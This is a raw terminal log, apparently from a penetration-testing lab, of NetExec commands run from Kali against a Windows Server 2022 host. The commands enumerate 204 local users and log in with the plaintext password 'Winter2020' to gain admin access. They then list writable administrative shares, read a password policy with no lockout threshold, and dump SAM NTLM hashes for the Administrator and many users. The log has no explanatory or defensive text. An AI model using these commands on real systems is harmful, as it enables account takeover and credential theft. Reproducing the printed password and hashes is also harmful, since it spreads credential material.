+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Catherine                     2025-09-23 09:57:03 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Charles                       2025-09-23 09:56:57 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Cheryl                        2025-09-23 09:56:57 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Christian                     2025-09-23 09:56:49 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Christina                     2025-09-23 09:57:01 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Christine                     2025-09-23 09:56:58 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Christopher                   2025-09-23 09:57:02 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Cynthia                       2025-09-23 09:57:02 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Daniel                        2025-09-23 09:56:58 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Danielle                      2025-09-23 09:56:56 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Deborah                       2025-09-23 09:56:50 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Debra                         2025-09-23 09:56:57 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  DefaultAccount                <never>             2       A user account managed by the system.
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Denise                        2025-09-23 09:57:02 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Dennis                        2025-09-23 09:57:03 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Diana                         2025-09-23 09:56:56 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Diane                         2025-09-23 09:56:56 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Donald                        2025-09-23 09:56:51 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Doris                         2025-09-23 09:57:00 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Dorothy                       2025-09-23 09:56:59 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Douglas                       2025-09-23 09:57:04 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Dylan                         2025-09-23 09:57:00 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Edward                        2025-09-23 09:57:01 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Elizabeth                     2025-09-23 09:57:00 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Emily                         2025-09-23 09:56:53 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Emma                          2025-09-23 09:56:52 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Eric                          2025-09-23 09:56:55 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Ethan                         2025-09-23 09:57:03 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Eugene                        2025-09-23 09:56:55 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Evelyn                        2025-09-23 09:56:52 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Frances                       2025-09-23 09:56:49 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Frank                         2025-09-23 09:56:56 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Gabriel                       2025-09-23 09:56:52 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Gary                          2025-09-23 09:57:02 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  George                        2025-09-23 09:56:49 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Gerald                        2025-09-23 09:56:54 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Gloria                        2025-09-23 09:56:55 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Grace                         2025-09-23 09:56:52 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Gregory                       2025-09-23 09:57:02 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Guest                         <never>             2       Built-in account for guest access to the computer/domain
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Hannah                        2025-09-23 09:56:57 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Harold                        2025-09-23 09:56:51 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Harry                         2025-09-23 09:56:57 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Heather                       2025-09-23 09:56:54 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Helen                         2025-09-23 09:56:53 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Henry                         2025-09-23 09:56:54 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Howard                        2025-09-23 09:56:50 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jack                          2025-09-23 09:57:03 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jacob                         2025-09-23 09:56:50 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jacqueline                    2025-09-23 09:56:49 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  James                         2025-09-23 09:56:58 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jane                          2025-09-23 09:56:49 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Janet                         2025-09-23 09:57:00 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Janice                        2025-09-23 09:57:00 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jason                         2025-09-23 09:56:49 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jean                          2025-09-23 09:56:51 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jeffrey                       2025-09-23 09:57:03 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jennifer                      2025-09-23 09:56:50 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jeremy                        2025-09-23 09:56:55 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jerry                         2025-09-23 09:57:03 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jesse                         2025-09-23 09:56:54 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jessica                       2025-09-23 09:56:54 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Joan                          2025-09-23 09:57:01 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Joe                           2025-09-23 09:56:55 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  John                          2025-09-23 09:56:55 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Johnny                        2025-09-23 09:56:57 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jonathan                      2025-09-23 09:56:59 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jordan                        2025-09-23 09:57:00 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jose                          2025-09-23 09:56:51 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Joseph                        2025-09-23 09:56:57 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Joshua                        2025-09-23 09:56:52 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Joyce                         2025-09-23 09:57:03 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Juan                          2025-09-23 09:56:53 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Judith                        2025-09-23 09:56:59 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Judy                          2025-09-23 09:56:57 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Julia                         2025-09-23 09:57:04 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Julie                         2025-09-23 09:56:53 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Justin                        2025-09-23 09:56:56 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Karen                         2025-09-23 09:56:51 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Katherine                     2025-09-23 09:57:03 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Kathleen                      2025-09-23 09:56:58 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Kathryn                       2025-09-23 09:57:01 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Kathy                         2025-09-23 09:56:58 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Keith                         2025-09-23 09:56:51 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Kelly                         2025-09-23 09:56:55 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Kenneth                       2025-09-23 09:56:57 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Kevin                         2025-09-23 09:57:04 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Kimberly                      2025-09-23 09:56:50 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Kyle                          2025-09-23 09:56:52 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Larry                         2025-09-23 09:56:53 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Laura                         2025-09-23 09:56:55 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Lauren                        2025-09-23 09:57:04 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Lawrence                      2025-09-23 09:56:53 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Linda                         2025-09-23 09:57:01 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Lisa                          2025-09-23 09:57:04 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Lori                          2025-09-23 09:56:59 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Louis                         2025-09-23 09:56:53 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Madison                       2025-09-23 09:56:57 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Margaret                      2025-09-23 09:56:53 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Maria                         2025-09-23 09:56:53 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Marie                         2025-09-23 09:56:59 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Marilyn                       2025-09-23 09:56:54 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Mark                          2025-09-23 09:56:56 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Martha                        2025-09-23 09:57:03 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Mary                          2025-09-23 09:57:03 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Matthew                       2025-09-23 09:57:01 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Megan                         2025-09-23 09:56:56 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Melissa                       2025-09-23 09:57:00 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Michael                       2025-09-23 09:57:02 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Michelle                      2025-09-23 09:56:56 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Mildred                       2025-09-23 09:57:04 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Nancy                         2025-09-23 09:56:50 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Natalie                       2025-09-23 09:57:02 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Nathan                        2025-09-23 09:57:01 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Nicholas                      2025-09-23 09:56:50 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Nicole                        2025-09-23 09:56:55 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Noah                          2025-09-23 09:57:02 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Olivia                        2025-09-23 09:56:56 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Pamela                        2025-09-23 09:57:04 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Patricia                      2025-09-23 09:56:54 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Patrick                       2025-09-23 09:56:55 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Paul                          2025-09-23 09:57:00 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Peter                         2025-09-23 09:57:04 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Philip                        2025-09-23 09:56:59 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Rachel                        2025-09-23 09:56:58 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Ralph                         2025-09-23 09:56:49 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Randy                         2025-09-23 09:56:54 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Raymond                       2025-09-23 09:56:52 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Rebecca                       2025-09-23 09:56:58 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Richard                       2025-09-23 09:56:59 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Robert                        2025-09-23 09:56:49 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Roger                         2025-09-23 09:56:52 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Ronald                        2025-09-23 09:56:51 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Rose                          2025-09-23 09:56:57 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Roy                           2025-09-23 09:57:04 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Russell                       2025-09-23 09:56:55 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Ruth                          2025-09-23 09:56:51 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Ryan                          2025-09-23 09:56:59 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Samantha                      2025-09-23 09:56:50 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Samuel                        2025-09-23 09:57:00 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Sandra                        2025-09-23 09:56:49 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Sara                          2025-09-23 09:56:51 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Sarah                         2025-09-23 09:57:04 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Scott                         2025-09-23 09:57:04 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Sean                          2025-09-23 09:57:01 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Sharon                        2025-09-23 09:57:01 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Shirley                       2025-09-23 09:57:03 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Stephanie                     2025-09-23 09:56:59 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Stephen                       2025-09-23 09:56:54 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Steven                        2025-09-23 09:56:51 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Susan                         2025-09-23 09:57:00 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Teresa                        2025-09-23 09:56:50 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Terry                         2025-09-23 09:57:02 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Theresa                       2025-09-23 09:57:04 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Thomas                        2025-09-23 09:56:58 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Tiffany                       2025-09-23 09:56:54 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Timothy                       2025-09-23 09:56:51 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Tyler                         2025-09-23 09:57:01 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Victoria                      2025-09-23 09:56:50 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Vincent                       2025-09-23 09:56:53 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Virginia                      2025-09-23 09:57:02 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Walter                        2025-09-23 09:56:54 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Wayne                         2025-09-23 09:56:55 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  WDAGUtilityAccount            2021-08-19 13:31:41 2       A user account managed and used by the system for Windows Defender Application Guard scenarios.
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  whitelist                     2024-07-09 21:08:23 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  William                       2025-09-23 09:56:58 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Willie                        2025-09-23 09:56:55 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Zachary                       2025-09-23 09:56:56 2
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  [*] Enumerated 204 local users: EC2AMAZ-IHPV2CM
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  [*] Writing 204 local users to users.txt
+
+┌──(kali㉿kali)-[~]
+└─$ nxc smb 10.10.234.39 -u Dennis -p 'Winter2020' --shares
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  [*] Windows Server 2022 Build 20348 x64 (name:EC2AMAZ-IHPV2CM) (domain:EC2AMAZ-IHPV2CM) (signing:False) (SMBv1:False)
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  [+] EC2AMAZ-IHPV2CM\Dennis:Winter2020 (Pwn3d!)
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  [*] Enumerated shares
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Share           Permissions     Remark
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  -----           -----------     ------
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  ADMIN$          READ,WRITE      Remote Admin
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  C$              READ,WRITE      Default share
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  IPC$            READ            Remote IPC
+
+┌──(kali㉿kali)-[~]
+└─$ nxc smb 10.10.234.39 -u Dennis -p 'Winter2020' -pass-pol
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  [*] Windows Server 2022 Build 20348 x64 (name:EC2AMAZ-IHPV2CM) (domain:EC2AMAZ-IHPV2CM) (signing:False) (SMBv1:False)
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  [-] EC2AMAZ-IHPV2CM\Dennis:ass-pol STATUS_LOGON_FAILURE
+
+┌──(kali㉿kali)-[~]
+└─$ nxc smb 10.10.234.39 -u Dennis -p 'Winter2020' --pass-pol
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  [*] Windows Server 2022 Build 20348 x64 (name:EC2AMAZ-IHPV2CM) (domain:EC2AMAZ-IHPV2CM) (signing:False) (SMBv1:False)
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  [+] EC2AMAZ-IHPV2CM\Dennis:Winter2020 (Pwn3d!)
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  [+] Dumping password info for domain: EC2AMAZ-IHPV2CM
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Minimum password length: None
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Password history length: None
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Maximum password age: Not Set
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Password Complexity Flags: 000000
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM      Domain Refuse Password Change: 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM      Domain Password Store Cleartext: 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM      Domain Password Lockout Admins: 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM      Domain Password No Clear Change: 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM      Domain Password No Anon Change: 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM      Domain Password Complex: 0
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Minimum password age: None
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Reset Account Lockout Counter: 30 minutes
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Locked Account Duration: 30 minutes
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Account Lockout Threshold: None
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Forced Log off Time: Not Set
+
+┌──(kali㉿kali)-[~]
+└─$ nxc smb 10.10.234.39 -u Dennis -p 'Winter2020' --loggedon-users
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  [*] Windows Server 2022 Build 20348 x64 (name:EC2AMAZ-IHPV2CM) (domain:EC2AMAZ-IHPV2CM) (signing:False) (SMBv1:False)
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  [+] EC2AMAZ-IHPV2CM\Dennis:Winter2020 (Pwn3d!)
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  EC2AMAZ-IHPV2CM\Administrator             logon_server: EC2AMAZ-IHPV2CM
+
+┌──(kali㉿kali)-[~]
+└─$ nxc smb 10.10.234.39 -u Dennis -p 'Winter2020' -sam
+usage: nxc [-h] [--version] [-t THREADS] [--timeout TIMEOUT]
+           [--jitter INTERVAL] [--verbose] [--debug] [--no-progress]
+           [--log LOG] [-6] [--dns-server DNS_SERVER] [--dns-tcp]
+           [--dns-timeout DNS_TIMEOUT]
+           {vnc,smb,nfs,mssql,winrm,ftp,rdp,ssh,wmi,ldap} ...
+nxc: error: unrecognized arguments: -sam
+
+┌──(kali㉿kali)-[~]
+└─$ nxc smb 10.10.234.39 -u Dennis -p 'Winter2020' --sam
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  [*] Windows Server 2022 Build 20348 x64 (name:EC2AMAZ-IHPV2CM) (domain:EC2AMAZ-IHPV2CM) (signing:False) (SMBv1:False)
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  [+] EC2AMAZ-IHPV2CM\Dennis:Winter2020 (Pwn3d!)
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  [*] Dumping SAM hashes
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Administrator:500:aad3b435b51404eeaad3b435b51404ee:08b8582777faf5eb38a80cbefc2cd50b:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:d7da45674bae3a0476c0f64b67121f7d:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  whitelist:1398:aad3b435b51404eeaad3b435b51404ee:434db24baf9270299080b205b2b5e16b:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Robert:1598:aad3b435b51404eeaad3b435b51404ee:502472f625746727fa99566032383067:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Christian:1599:aad3b435b51404eeaad3b435b51404ee:efca437e83ebae8cb0b30dc0e9b4edc7:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Frances:1600:aad3b435b51404eeaad3b435b51404ee:cf89424835b551df4a6649cc55e1a837:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jacqueline:1601:aad3b435b51404eeaad3b435b51404ee:6418c40cf4a9b4ceec4c81653de60361:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Sandra:1602:aad3b435b51404eeaad3b435b51404ee:3fa47b913cab4c708d59736e9cacc8dd:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Ralph:1603:aad3b435b51404eeaad3b435b51404ee:0162e8fb40de6028360353b5cbe44874:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jason:1604:aad3b435b51404eeaad3b435b51404ee:dd7c4025b001a53a141893795e3d276b:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Albert:1605:aad3b435b51404eeaad3b435b51404ee:c6b1d1767038496f67a072b171484b40:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jane:1606:aad3b435b51404eeaad3b435b51404ee:2da79dc7647c7cac59dafca93efd71f4:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Amanda:1607:aad3b435b51404eeaad3b435b51404ee:e510bfa7c16fb1b1c9f23c4ac28e6c5a:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  George:1608:aad3b435b51404eeaad3b435b51404ee:939b0b99ec828f83750eaa22c7d71706:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Barbara:1609:aad3b435b51404eeaad3b435b51404ee:918198fecdf95f7a8ef32b052b4a513b:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Victoria:1610:aad3b435b51404eeaad3b435b51404ee:2d3bcca718443905f098241fc8695b87:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Amy:1611:aad3b435b51404eeaad3b435b51404ee:4a8e6829349c1d52f29c5370ee4f4e27:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Kimberly:1612:aad3b435b51404eeaad3b435b51404ee:ff38272043dfe862af012d40cb3614f2:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Samantha:1613:aad3b435b51404eeaad3b435b51404ee:4a1c89207534246fc7b2b83a4812d0a5:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Nancy:1614:aad3b435b51404eeaad3b435b51404ee:052d9d83cc033f1cef961b3b7d85fca6:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Amber:1615:aad3b435b51404eeaad3b435b51404ee:d02b82d20e5e4eb129c5666bbd2d0ac1:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Deborah:1616:aad3b435b51404eeaad3b435b51404ee:b5602bd8338e0521b865ee9d8191e7cc:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jennifer:1617:aad3b435b51404eeaad3b435b51404ee:63e813883380ebe2ed40a6134ca42231:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Nicholas:1618:aad3b435b51404eeaad3b435b51404ee:9126ec1bace7ce6c7ea6fe68a8b42714:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Teresa:1619:aad3b435b51404eeaad3b435b51404ee:3ccacdd4984519197cfc8434df9c37d1:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Howard:1620:aad3b435b51404eeaad3b435b51404ee:f50300eb51542bd923301d528adab9fc:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jacob:1621:aad3b435b51404eeaad3b435b51404ee:80f8df39d6b670be0b5e610331ae77cb:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Steven:1622:aad3b435b51404eeaad3b435b51404ee:dbf7a94f2bc9e33ca921567097a84df4:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Ronald:1623:aad3b435b51404eeaad3b435b51404ee:40de320a59bc07a5818565369e82ebdb:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Ashley:1624:aad3b435b51404eeaad3b435b51404ee:94ddfcde3b1193d0d86f2e697925fcb7:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Timothy:1625:aad3b435b51404eeaad3b435b51404ee:6edf04266ad425553ce019f76e44c576:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Sara:1626:aad3b435b51404eeaad3b435b51404ee:e66fc7172c5927bba6bc7bb78733205c:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jose:1627:aad3b435b51404eeaad3b435b51404ee:9a6ffdfd681fb7c3969a30f6383ac098:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Harold:1628:aad3b435b51404eeaad3b435b51404ee:f716fc916479fb383db331f6d6368210:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Ruth:1629:aad3b435b51404eeaad3b435b51404ee:4e00e6dd76fae62e14a7c0e593b638ce:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Keith:1630:aad3b435b51404eeaad3b435b51404ee:2ee768760ffb913f86322f4bc70f19c0:::
+SMB         10.10.234.39    445    EC2AMAZ-IHPV2CM  Jean:1631:aad3b435b51404eeaad3b435b51404ee:5e0013a6f6dd9a6861b4a123bccd1ad0:::
